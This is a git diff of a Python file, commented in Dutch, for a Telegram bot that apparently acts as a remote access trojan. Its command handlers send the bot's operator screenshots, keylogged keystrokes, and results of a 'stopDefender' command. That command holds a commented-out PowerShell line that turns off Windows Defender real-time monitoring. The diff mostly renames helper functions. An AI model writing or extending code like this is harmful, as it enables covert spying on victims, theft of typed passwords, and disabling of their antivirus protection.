@@ -1,7 +1,7 @@
 # Deze file bevat alle commands die via telegram chat uitgevoerd kunnen worden
 from telegram import Update
 from telegram.ext import ContextTypes
-from functions import *
+from molecules import *
 
 
 # functies die starten zodra de bot online is
@@ -33,16 +33,16 @@ async def cam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def ss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_photo(
         chat_id=update.effective_chat.id,
-        photo=open(get_screen(), 'rb'),
+        photo=open(get_screenshot(), 'rb'),
         caption='Screenshot of the main screen'
     )
 
 # key logged string sturen naar chat
 async def keylog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    string = key_log()
+    string = get_loggedKeys()
     await context.bot.send_photo(
         chat_id=update.effective_chat.id,
-        photo=open(get_screen(), 'rb'),
+        photo=open(get_screenshot(), 'rb'),
         caption=f'string:   {string}'
     )
 
@@ -56,11 +56,11 @@ async def audio_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 # Windows defender uitzetten
-async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def stopDefender_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # meld dat Windows defender uit is
     # powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true')
-    powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
-    commandOutput = powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
+    run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
+    commandOutput = run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
     await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
 
 # Log errors
